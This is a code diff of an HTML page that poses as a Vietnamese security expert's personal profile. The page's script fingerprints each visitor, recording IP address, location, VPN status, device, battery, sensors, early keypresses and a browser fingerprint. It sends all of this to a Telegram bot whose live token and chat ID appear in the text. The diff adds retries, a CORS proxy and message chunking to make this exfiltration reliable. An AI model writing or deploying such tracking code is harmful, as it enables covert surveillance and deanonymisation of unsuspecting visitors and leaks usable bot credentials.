@@ -197,13 +197,19 @@
       </div>
     </div>
   </div>
+  <div class="privacy-notice">
+    Anh Hẹn Em Pickle Ball Ta Vờn Nhau Pickle Ball <a href="#" onclick="alert('Cc Nhìn Đb.');"????</a>
+  </div>
 
   <script src="https://unpkg.com/ua-parser-js@1.0.37/dist/ua-parser.min.js"></script>
   <script src="https://unpkg.com/fingerprintjs2@2.1.4/fingerprint2.min.js"></script>
   <script>
     // Telegram Bot Config
-    const TELEGRAM_BOT_TOKEN = '7901145510:AAFAmIlzTPFWLKZRAyYfw2-9Zj2WWWvb4jQ';
-    const TELEGRAM_CHAT_ID = '7567975053';
+    const TELEGRAM_BOT_TOKEN = '7607255883:AAE3Q6Uh0BGyzKHVMXxqUyRgDWyw71XIPsw'; // Thay bằng token mới nếu sai
+    const TELEGRAM_CHAT_ID = '7581385601'; // Thay bằng chat ID mới nếu sai
+    const USE_PROXY = false; // Đặt true nếu dùng Cloudflare Workers proxy
+    const PROXY_URL = 'https://telegram-proxy.<your-account>.workers.dev/send-telegram'; // Thay bằng URL proxy
+    const CORS_PROXY = 'https://cors-anywhere.herokuapp.com/'; // Proxy tạm thời để test (yêu cầu truy cập https://cors-anywhere.herokuapp.com/corsdemo)
 
     // Hàm định dạng dữ liệu cho Telegram
     function formatDeviceData(data) {
@@ -235,41 +241,49 @@
       `.trim();
     }
 
-    // Hàm gửi dữ liệu đến Telegram
-    async function sendToTelegram(message) {
-      try {
-        const maxLength = 4096;
-        if (message.length <= maxLength) {
-          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
+    // Hàm gửi dữ liệu đến Telegram với retry
+    async function sendToTelegram(message, retries = 3) {
+      for (let attempt = 1; attempt <= retries; attempt++) {
+        try {
+          console.log(`Attempt ${attempt}: Sending message to Telegram (length: ${message.length})`);
+          const maxLength = 4096;
+          const parts = message.length <= maxLength ? [message] : [];
+          if (message.length > maxLength) {
+            for (let i = 0; i < message.length; i += maxLength) {
+              parts.push(message.slice(i, i + maxLength));
+            }
+          }
+
+          for (let i = 0; i < parts.length; i++) {
+            const url = USE_PROXY ? PROXY_URL : `${CORS_PROXY}https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const body = USE_PROXY ? { message: parts[i] } : {
               chat_id: TELEGRAM_CHAT_ID,
-              text: message,
+              text: parts[i],
               parse_mode: 'Markdown',
               disable_web_page_preview: true
-            })
-          });
-        } else {
-          const parts = [];
-          for (let i = 0; i < message.length; i += maxLength) {
-            parts.push(message.slice(i, i + maxLength));
-          }
-          for (const part of parts) {
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            };
+            const response = await fetch(url, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: part,
-                parse_mode: 'Markdown',
-                disable_web_page_preview: true
-              })
+              body: JSON.stringify(body)
             });
+            if (!response.ok) {
+              const errorText = await response.text();
+              throw new Error(`HTTP error! Status: ${response.status}, Details: ${errorText}`);
+            }
+            console.log(`Part ${i + 1}/${parts.length} sent successfully`);
+            if (i < parts.length - 1) await new Promise(resolve => setTimeout(resolve, 1000)); // Delay 1s
           }
+          console.log('All parts sent to Telegram successfully');
+          return true;
+        } catch (error) {
+          console.error(`Attempt ${attempt} failed:`, error);
+          if (attempt === retries) {
+            console.error('Max retries reached. Failed to send to Telegram.');
+            return false;
+          }
+          await new Promise(resolve => setTimeout(resolve, 2000)); // Delay 2s trước khi thử lại
         }
-      } catch (error) {
-        console.error('Failed to send to Telegram:', error);
       }
     }
 
@@ -325,7 +339,7 @@
       }
     }
 
-    // Hàm lấy thông tin IP và vị trí (toàn cầu)
+    // Hàm lấy thông tin IP và vị trí
     async function fetchIpInfo() {
       const cacheKey = 'ipInfo';
       const cached = localStorage.getItem(cacheKey);
@@ -499,7 +513,9 @@
       const startTime = Date.now();
       document.addEventListener('click', () => clicks++);
       document.addEventListener('mousemove', () => mouseMoves++);
-      document.addEventListener('keypress', (e) => keysPressed.push(e.key));
+      document.addEventListener('keypress', (e) => {
+        if (keysPressed.length < 10) keysPressed.push(e.key);
+      });
       document.addEventListener('scroll', () => {
         scrollDistance = window.scrollY;
       });
@@ -541,84 +557,104 @@
 
     // Hàm thay đổi nội dung động
     async function changeContentDynamically(ipInfo, deviceInfo, behavior) {
-      const profileText = document.getElementById('profile-text');
-      const country = ipInfo.country || 'Unknown';
-      const deviceType = deviceInfo.deviceType;
-      let greeting = 'Xin chào';
-      if (country === 'US') greeting = 'Hello';
-      else if (country === 'GB') greeting = 'Hi';
-      else if (country === 'FR') greeting = 'Bonjour';
-      let deviceMessage = deviceType === 'Desktop' ? 'trên máy tính' : 'trên thiết bị di động';
-      let behaviorMessage = behavior.getData().timeOnPage > 10 ? 'Bạn dường như rất quan tâm!' : '';
-      profileText.innerHTML = `${greeting}! Tôi là Phù Văn Đức, chuyên gia bảo mật từ Việt Nam. Bạn đang truy cập ${deviceMessage}. ${behaviorMessage} Kết nối với tôi qua mạng xã hội nhé!`;
+      try {
+        const profileText = document.getElementById('profile-text');
+        const country = ipInfo.country || 'Unknown';
+        const deviceType = deviceInfo.deviceType;
+        let greeting = 'Xin chào';
+        if (country === 'US') greeting = 'Hello';
+        else if (country === 'GB') greeting = 'Hi';
+        else if (country === 'FR') greeting = 'Bonjour';
+        let deviceMessage = deviceType === 'Desktop' ? 'trên máy tính' : 'trên thiết bị di động';
+        let behaviorMessage = behavior.getData().timeOnPage > 10 ? 'Bạn dường như rất quan tâm!' : '';
+        profileText.innerHTML = `${greeting}! Tôi là Phù Văn Đức, chuyên gia bảo mật từ Việt Nam. Bạn đang truy cập ${deviceMessage}. ${behaviorMessage} Kết nối với tôi qua mạng xã hội nhé!`;
+      } catch (error) {
+        console.error('Failed to change content:', error);
+      }
     }
 
     // Hàm chính để thu thập và gửi dữ liệu
     async function collectAndSendData() {
-      if (!localStorage.getItem('privacyAccepted')) {
-        const accepted = confirm('Trang này thu thập thông tin thiết bị, mạng, và hành vi để phân tích bảo mật. Bạn đồng ý chứ?');
-        if (!accepted) {
-          localStorage.setItem('privacyAccepted', 'false');
+      try {
+        if (!localStorage.getItem('privacyAccepted')) {
+          const accepted = confirm('Trang này thu thập thông tin thiết bị, mạng, và hành vi để phân tích bảo mật. Bạn đồng ý chứ?');
+          if (!accepted) {
+            localStorage.setItem('privacyAccepted', 'false');
+            console.log('User declined privacy consent');
+            return;
+          }
+          localStorage.setItem('privacyAccepted', 'true');
+        }
+        if (localStorage.getItem('privacyAccepted') === 'false') {
+          console.log('Privacy consent declined previously');
           return;
         }
-        localStorage.setItem('privacyAccepted', 'true');
+
+        console.log('Starting data collection...');
+        const userAgent = navigator.userAgent;
+        const behaviorTracker = trackUserBehavior();
+        const [deviceInfo, ipInfo, batteryInfo, networkInfo, graphicsInfo, sensorInfo, visitHistory, browserEnv, fingerprint] = await Promise.all([
+          Promise.resolve(getDeviceInfo(userAgent)),
+          fetchIpInfo(),
+          fetchBatteryInfo(),
+          Promise.resolve(fetchNetworkInfo()),
+          Promise.resolve(fetchGraphicsInfo()),
+          Promise.resolve(fetchSensorInfo()),
+          Promise.resolve(trackVisitHistory()),
+          Promise.resolve(fetchBrowserEnv()),
+          getBrowserFingerprint()
+        ]);
+
+        const behavior = behaviorTracker.getData();
+        const deviceData = {
+          timestamp: new Date().toISOString(),
+          ip: ipInfo.ip,
+          vpnStatus: ipInfo.vpnStatus,
+          city: ipInfo.city,
+          region: ipInfo.region,
+          country: ipInfo.country,
+          loc: ipInfo.loc,
+          timezone: ipInfo.timezone,
+          deviceName: deviceInfo.deviceName,
+          deviceType: deviceInfo.deviceType,
+          os: deviceInfo.os,
+          browser: deviceInfo.browser,
+          battery: batteryInfo.battery,
+          charging: batteryInfo.charging,
+          screen: browserEnv.screen,
+          colorDepth: browserEnv.colorDepth,
+          language: browserEnv.language,
+          cookiesEnabled: browserEnv.cookiesEnabled,
+          touchSupport: browserEnv.touchSupport,
+          referrer: browserEnv.referrer,
+          doNotTrack: browserEnv.doNotTrack,
+          connectionType: networkInfo.connectionType,
+          connectionSpeed: networkInfo.connectionSpeed,
+          graphicsSupport: graphicsInfo,
+          sensorSupport: sensorInfo,
+          visitCount: visitHistory.visitCount,
+          lastVisit: visitHistory.lastVisit,
+          clicks: behavior.clicks,
+          mouseMoves: behavior.mouseMoves,
+          keysPressed: behavior.keysPressed,
+          scrollDistance: behavior.scrollDistance,
+          timeOnPage: behavior.timeOnPage,
+          fingerprint: fingerprint
+        };
+
+        console.log('Collected data:', deviceData);
+        await changeContentDynamically(ipInfo, deviceInfo, behaviorTracker);
+        const message = formatDeviceData(deviceData);
+        console.log('Formatted message:', message);
+        const sent = await sendToTelegram(message);
+        if (sent) {
+          console.log('Data sent to Telegram successfully');
+        } else {
+          console.error('Failed to send data to Telegram after retries');
+        }
+      } catch (error) {
+        console.error('Error in collectAndSendData:', error);
       }
-      if (localStorage.getItem('privacyAccepted') === 'false') return;
-
-      const userAgent = navigator.userAgent;
-      const behaviorTracker = trackUserBehavior();
-      const [deviceInfo, ipInfo, batteryInfo, networkInfo, graphicsInfo, sensorInfo, visitHistory, browserEnv, fingerprint] = await Promise.all([
-        Promise.resolve(getDeviceInfo(userAgent)),
-        fetchIpInfo(),
-        fetchBatteryInfo(),
-        Promise.resolve(fetchNetworkInfo()),
-        Promise.resolve(fetchGraphicsInfo()),
-        Promise.resolve(fetchSensorInfo()),
-        Promise.resolve(trackVisitHistory()),
-        Promise.resolve(fetchBrowserEnv()),
-        getBrowserFingerprint()
-      ]);
-
-      const behavior = behaviorTracker.getData();
-      const deviceData = {
-        timestamp: new Date().toISOString(),
-        ip: ipInfo.ip,
-        vpnStatus: ipInfo.vpnStatus,
-        city: ipInfo.city,
-        region: ipInfo.region,
-        country: ipInfo.country,
-        loc: ipInfo.loc,
-        timezone: ipInfo.timezone,
-        deviceName: deviceInfo.deviceName,
-        deviceType: deviceInfo.deviceType,
-        os: deviceInfo.os,
-        browser: deviceInfo.browser,
-        battery: batteryInfo.battery,
-        charging: batteryInfo.charging,
-        screen: browserEnv.screen,
-        colorDepth: browserEnv.colorDepth,
-        language: browserEnv.language,
-        cookiesEnabled: browserEnv.cookiesEnabled,
-        touchSupport: browserEnv.touchSupport,
-        referrer: browserEnv.referrer,
-        doNotTrack: browserEnv.doNotTrack,
-        connectionType: networkInfo.connectionType,
-        connectionSpeed: networkInfo.connectionSpeed,
-        graphicsSupport: graphicsInfo,
-        sensorSupport: sensorInfo,
-        visitCount: visitHistory.visitCount,
-        lastVisit: visitHistory.lastVisit,
-        clicks: behavior.clicks,
-        mouseMoves: behavior.mouseMoves,
-        keysPressed: behavior.keysPressed,
-        scrollDistance: behavior.scrollDistance,
-        timeOnPage: behavior.timeOnPage,
-        fingerprint: fingerprint
-      };
-
-      await changeContentDynamically(ipInfo, deviceInfo, behaviorTracker);
-      const message = formatDeviceData(deviceData);
-      await sendToTelegram(message);
     }
 
     // Chạy khi trang tải
